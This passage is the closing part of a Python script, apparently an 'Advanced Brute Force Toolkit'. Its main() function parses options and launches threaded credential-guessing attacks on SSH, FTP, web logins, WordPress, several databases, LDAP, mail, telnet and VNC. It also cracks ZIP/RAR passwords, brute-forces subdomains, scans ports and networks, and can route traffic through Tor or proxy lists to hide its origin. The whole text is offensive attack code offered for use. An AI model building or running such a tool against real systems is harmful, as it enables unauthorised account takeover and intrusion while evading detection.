    engine.load_session()
    
    parser = argparse.ArgumentParser(description=f"{Colors.GREEN}Advanced Brute Force Toolkit{Colors.RESET}", 
                                   formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-t', '--target', help="Target host or URL (can be comma-separated list)")
    parser.add_argument('-T', '--target-list', help="File containing list of targets")
    parser.add_argument('-u', '--username', help="Single username to test")
    parser.add_argument('-U', '--userlist', help="File containing list of usernames")
    parser.add_argument('-p', '--password', help="Single password to test")
    parser.add_argument('-P', '--passlist', help="File containing list of passwords")
    parser.add_argument('-s', '--service', 
                       choices=['ssh', 'ftp', 'http', 'wordpress', 'selenium', 'zip', 'rar', 
                               'mysql', 'postgresql', 'mssql', 'mongodb', 'redis',
                               'ldap', 'smtp', 'imap', 'pop3', 'telnet', 'vnc'], 
                       help="Service to attack")
    parser.add_argument('--threads', type=int, default=MAX_THREADS, 
                       help=f"Number of threads (default: {MAX_THREADS})")
    parser.add_argument('-d', '--delay', type=float, default=0, 
                       help="Delay between attempts in seconds")
    parser.add_argument('-x', '--proxy', help="Proxy list file")
    parser.add_argument('--tor', action='store_true', help="Use Tor proxy (localhost:9050)")
    parser.add_argument('--tor-port', type=int, default=9050, 
                       help="Tor proxy port (default: 9050)")
    parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
    parser.add_argument('-R', '--rules', help="Password transformation rules file")
    parser.add_argument('--dns-enum', metavar='DOMAIN', help="Perform DNS enumeration")
    parser.add_argument('--subdomain', metavar='DOMAIN', help="Brute force subdomains")
    parser.add_argument('--subdomain-list', help="Subdomain wordlist file (default: common_subdomains.txt)")
    parser.add_argument('--port-scan', metavar='TARGET', help="Perform port scanning")
    parser.add_argument('--network-scan', metavar='NETWORK', help="Perform network scan (e.g., 192.168.1.0/24)")
    parser.add_argument('--ports', default='1-1024', 
                       help="Port range for scanning (default: 1-1024)")
    parser.add_argument('--scan-type', choices=['connect', 'nmap'], default='connect', 
                       help="Port scan type (default: connect)")
    parser.add_argument('--website-info', metavar='URL', help="Gather information about a website")
    parser.add_argument('--generate-report', choices=['html', 'csv', 'json', 'text'], 
                       help="Generate report of findings")
    parser.add_argument('--password-analysis', metavar='PASSWORD', 
                       help="Analyze password strength and provide feedback")
    parser.add_argument('--generate-wordlist', action='store_true', 
                       help="Generate password wordlist from base words")
    parser.add_argument('--base-words', help="File containing base words for wordlist generation")
    parser.add_argument('--output-wordlist', help="Output file for generated wordlist")
    parser.add_argument('-i', '--interactive', action='store_true', 
                       help="Start interactive shell")
    
    args = parser.parse_args()
    
    # Configure engine
    engine.verbose = args.verbose
    engine.max_threads = args.threads
    engine.delay = args.delay
    
    if args.proxy:
        engine.load_proxies(args.proxy)
    elif args.tor:
        engine.setup_tor(args.tor_port)
    
    # Start interactive shell if requested
    if args.interactive:
        shell = InteractiveShell(engine)
        shell.start()
        return
    
    # Handle password analysis
    if args.password_analysis:
        analysis = engine.password_strength(args.password_analysis)
        print(f"\n{Colors.YELLOW}[*] Password Analysis:{Colors.RESET}")
        print(f"{Colors.GREEN}Password: {args.password_analysis}{Colors.RESET}")
        print(f"{Colors.GREEN}Strength: {analysis['score']}/10{Colors.RESET}")
        print(f"{Colors.GREEN}Length: {analysis['length']} characters{Colors.RESET}")
        print(f"{Colors.YELLOW}Feedback:{Colors.RESET}")
        for feedback in analysis['feedback']:
            print(f" - {feedback}")
        return
    
    # Handle wordlist generation
    if args.generate_wordlist:
        if not args.base_words or not args.output_wordlist:
            print(f"{Colors.RED}[!] Both --base-words and --output-wordlist are required{Colors.RESET}")
            return
            
        try:
            with open(args.base_words, 'r') as f:
                base_words = [line.strip() for line in f if line.strip()]
                
            rules = []
            if args.rules:
                rules = engine.load_rules(args.rules)
                
            passwords = engine.generate_password_list(base_words, rules)
            
            with open(args.output_wordlist, 'w') as f:
                f.write('\n'.join(passwords))
                
            print(f"\n{Colors.GREEN}[+] Generated {len(passwords)} passwords to {args.output_wordlist}{Colors.RESET}")
            return
        except Exception as e:
            print(f"{Colors.RED}[!] Wordlist generation failed: {e}{Colors.RESET}")
            return
    
    # Handle DNS enumeration
    if args.dns_enum:
        results = engine.dns_enumeration(args.dns_enum)
        print(f"\n{Colors.YELLOW}[*] DNS Enumeration Results for {args.dns_enum}:{Colors.RESET}")
        for record_type, values in results.items():
            print(f"{Colors.GREEN}{record_type}:{Colors.RESET} {', '.join(values)}")
        return
    
    # Handle subdomain brute forcing
    if args.subdomain:
        wordlist_file = args.subdomain_list or os.path.join(WORDLIST_DIR, 'common_subdomains.txt')
        if not os.path.exists(wordlist_file):
            print(f"{Colors.RED}[!] Subdomain wordlist file not found: {wordlist_file}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] You can specify one with --subdomain-list{Colors.RESET}")
            return
            
        print(f"\n{Colors.YELLOW}[*] Starting subdomain brute force on {args.subdomain}{Colors.RESET}")
        valid_subdomains = engine.subdomain_brute(args.subdomain, wordlist_file)
        print(f"\n{Colors.GREEN}[+] Found {len(valid_subdomains)} valid subdomains:{Colors.RESET}")
        for sub in valid_subdomains:
            print(f" - {sub}")
        return
    
    # Handle port scanning
    if args.port_scan:
        print(f"\n{Colors.YELLOW}[*] Starting port scan on {args.port_scan}{Colors.RESET}")
        open_ports = engine.port_scan(args.port_scan, args.ports, args.scan_type)
        print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports:{Colors.RESET}")
        for port, proto, service in open_ports:
            print(f" - {port}/{proto}: {service}")
        return
    
    # Handle network scanning
    if args.network_scan:
        print(f"\n{Colors.YELLOW}[*] Starting network scan on {args.network_scan}{Colors.RESET}")
        active_hosts = engine.network_scan(args.network_scan)
        print(f"\n{Colors.GREEN}[+] Found {len(active_hosts)} active hosts:{Colors.RESET}")
        for host in active_hosts:
            print(f" - {host['ip']} ({host['mac']})")
        return
    
    # Handle website information gathering
    if args.website_info:
        print(f"\n{Colors.YELLOW}[*] Gathering information about {args.website_info}{Colors.RESET}")
        info = engine.website_info(args.website_info)
        print(f"\n{Colors.GREEN}[+] Website Information:{Colors.RESET}")
        print(f"Final URL: {info.get('final_url', 'N/A')}")
        print(f"Status Code: {info.get('status_code', 'N/A')}")
        print(f"Content Type: {info.get('content_type', 'N/A')}")
        print(f"Technologies: {', '.join(info.get('technologies', [])) or 'N/A'}")
        
        if info.get('ssl_info'):
            print(f"\n{Colors.YELLOW}SSL Certificate Information:{Colors.RESET}")
            print(f"Subject: {info['ssl_info'].get('subject', 'N/A')}")
            print(f"Issuer: {info['ssl_info'].get('issuer', 'N/A')}")
            print(f"Expires: {info['ssl_info'].get('expires', 'N/A')}")
            
        return
    
    # Handle report generation
    if args.generate_report:
        report_file = engine.generate_report(args.generate_report)
        if report_file:
            print(f"\n{Colors.GREEN}[+] Report generated: {report_file}{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}[!] Failed to generate report{Colors.RESET}")
        return
    
    # Handle ZIP file brute forcing
    if args.service == 'zip':
        if not args.target:
            print(f"{Colors.RED}[!] ZIP file path required with -t{Colors.RESET}")
            return
        if not args.passlist and not args.password:
            print(f"{Colors.RED}[!] Password list or single password required{Colors.RESET}")
            return
            
        passwords = []
        if args.passlist:
            with open(args.passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        elif args.password:
            passwords = [args.password]
            
        print(f"\n{Colors.YELLOW}[*] Starting ZIP password brute force on {args.target}{Colors.RESET}")
        result = engine.zip_brute(args.target, passwords)
        if result:
            print(f"\n{Colors.GREEN}[+] Success! Password found: {result}{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}[!] Password not found in the provided list{Colors.RESET}")
        return
    
    # Handle RAR file brute forcing
    if args.service == 'rar':
        if not args.target:
            print(f"{Colors.RED}[!] RAR file path required with -t{Colors.RESET}")
            return
        if not args.passlist and not args.password:
            print(f"{Colors.RED}[!] Password list or single password required{Colors.RESET}")
            return
            
        passwords = []
        if args.passlist:
            with open(args.passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        elif args.password:
            passwords = [args.password]
            
        print(f"\n{Colors.YELLOW}[*] Starting RAR password brute force on {args.target}{Colors.RESET}")
        result = engine.rar_brute(args.target, passwords)
        if result:
            print(f"\n{Colors.GREEN}[+] Success! Password found: {result}{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}[!] Password not found in the provided list{Colors.RESET}")
        return
    
    # Standard brute force operations
    if not args.service or (not args.target and not args.target_list):
        parser.print_help()
        return
        
    # Load targets
    targets = []
    if args.target:
        targets = [t.strip() for t in args.target.split(',')]
    elif args.target_list:
        try:
            with open(args.target_list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to load target list: {e}{Colors.RESET}")
            return
            
    if not targets:
        print(f"{Colors.RED}[!] No valid targets specified{Colors.RESET}")
        return
        
    # Load usernames
    usernames = []
    if args.userlist:
        try:
            with open(args.userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to load username list: {e}{Colors.RESET}")
            return
    elif args.username:
        usernames = [args.username]
    else:
        # Try default username list
        default_userlist = os.path.join(WORDLIST_DIR, 'common_usernames.txt')
        if os.path.exists(default_userlist):
            print(f"{Colors.YELLOW}[*] Using default username list: {default_userlist}{Colors.RESET}")
            with open(default_userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        else:
            print(f"{Colors.RED}[!] Username or username list required{Colors.RESET}")
            return
        
    # Load passwords
    passwords = []
    if args.passlist:
        try:
            with open(args.passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to load password list: {e}{Colors.RESET}")
            return
    elif args.password:
        passwords = [args.password]
    else:
        # Try default password list
        default_passlist = os.path.join(WORDLIST_DIR, 'common_passwords.txt')
        if os.path.exists(default_passlist):
            print(f"{Colors.YELLOW}[*] Using default password list: {default_passlist}{Colors.RESET}")
            with open(default_passlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            print(f"{Colors.RED}[!] Password or password list required{Colors.RESET}")
            return
        
    # Apply password rules if specified
    if args.rules:
        rules = engine.load_rules(args.rules)
        if rules:
            passwords = engine.generate_password_list(passwords, rules)
            print(f"{Colors.YELLOW}[*] Generated {len(passwords)} passwords with rules{Colors.RESET}")
    
    # Select service function
    service_func = None
    if args.service == 'ssh':
        service_func = engine.ssh_brute
    elif args.service == 'ftp':
        service_func = engine.ftp_brute
    elif args.service == 'http':
        service_func = engine.http_form_brute
    elif args.service == 'wordpress':
        service_func = engine.wordpress_brute
    elif args.service == 'selenium':
        service_func = engine.selenium_brute
    elif args.service == 'mysql':
        service_func = engine.mysql_brute
    elif args.service == 'postgresql':
        service_func = engine.postgresql_brute
    elif args.service == 'mssql':
        service_func = engine.mssql_brute
    elif args.service == 'mongodb':
        service_func = engine.mongodb_brute
    elif args.service == 'redis':
        service_func = engine.redis_brute
    elif args.service == 'ldap':
        service_func = engine.ldap_brute
    elif args.service == 'smtp':
        service_func = engine.smtp_brute
    elif args.service == 'imap':
        service_func = engine.imap_brute
    elif args.service == 'pop3':
        service_func = engine.pop3_brute
    elif args.service == 'telnet':
        service_func = engine.telnet_brute
    elif args.service == 'vnc':
        service_func = engine.vnc_brute
    
    if not service_func:
        print(f"{Colors.RED}[!] Invalid service specified{Colors.RESET}")
        return
        
    # Run the attack
    print(f"\n{Colors.YELLOW}[*] Starting {args.service} brute force attack on {len(targets)} target(s){Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Usernames: {len(usernames)}, Passwords: {len(passwords)}, Threads: {args.threads}{Colors.RESET}")
    
    credentials = [(u, p) for u in usernames for p in passwords]
    success, fail = engine.threaded_attack(service_func, targets, credentials)
    
    print(f"\n{Colors.GREEN}[+] Attack completed. Success: {success}, Failed: {fail}{Colors.RESET}")
    
    # Save session state
    engine.save_session()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Operation cancelled by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Critical error: {e}{Colors.RESET}")
        sys.exit(1)
